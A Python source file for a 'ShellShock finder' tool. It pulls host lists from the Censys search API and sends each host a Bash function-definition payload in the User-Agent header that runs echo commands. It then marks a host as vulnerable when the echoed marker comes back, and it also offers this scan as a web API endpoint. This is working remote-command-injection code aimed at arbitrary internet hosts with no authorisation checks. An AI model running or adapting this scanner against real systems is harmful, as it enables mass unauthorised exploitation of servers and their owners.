"""ShellShock finder utility"""

import hug
import traceback
import json
import requests
import os
import sys
from rtfmapi.config import ConfigSectionMap

# Heavily based on https://github.com/mthbernardes/EvilTool

class ShellShock(object):
    api_url = "https://www.censys.io/api/v1"
    query = '80.http.get.title:/cgi-bin/test.cgi'
    urls = set()
    vulnerable_urls = set()
    user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; echo 'EVILTOOLZIKAMEMO'"}
    config = ConfigSectionMap('mthbernardes_shellshock')

    def __init__(self, uid=None, secret=None):
        self.uid = self.config['uid'] if uid == None else uid
        self.secret = self.config['secret'] if secret == None else secret

    def get_results(self):
        '''Gets vulnerable urls'''
        self.urls = set()
        pages = float('inf')
        page = 1
        while page <= pages:
            r = requests.post('{}/search/ipv4'.format(self.api_url), auth=(self.uid, self.secret), json={'query':
                self.query, 'page': page})
            data = r.json()
            if r.status_code == 200:
                for info in data['results']:
                    self.urls.add('http://{}/cgi-bin/test.cgi'.format(info['ip']))
            pages = data['metadata']['pages']
            page += 1
        return self.urls

    def test_results(self, max_vuln=float('inf')):
        '''Tests vulnerable urls'''
        vuln_count = 0
        for url in self.urls:
            if vuln_count <= max_vuln:
                try:
                    sys.stdout.write('.')
                    sys.stdout.flush()
                    conn = requests.get(url, timeout=5, headers=self.user_agent ,allow_redirects=True)

                    if conn.status_code != 200:
                        raise Exception('Something went wrong: {}'.format(conn.status_code))
                    else:
                        if conn.content.find('EVILTOOLZIKAMEMO'.encode('utf-8')) != -1:
                            self.vulnerable_urls.add(url)
                            print('[+] Vulnerable URL: {}'.format(url))
                        else:
                            print('[-] Not vulnerable: {}'.format(url))
                except Exception as e:
                    #traceback.print_exc()
                    pass
            else:
                break
        return self.vulnerable_urls

@hug.post('/possible', output=hug.output_format.json)
def possible_api(uid:str=None, secret:str=None):
    '''Gets vulnerable URLs'''
    if uid == None or secret == None:
        ss = ShellShock()
    else:
        ss = ShellShock(uid, secret)
    return list(ss.get_results())

if __name__ == '__main__':
    ss = ShellShock(sys.argv[0], sys.argv[1])
    ss.get_results()
    print('[*] Found {} urls'.format(len(ss.urls)))
    print('[*] Testing if urls are vulnerable')
    ss.test_results(2)
    print('[*] Of those, {} are vulnerable:'.format(len(ss.vulnerable_urls)))
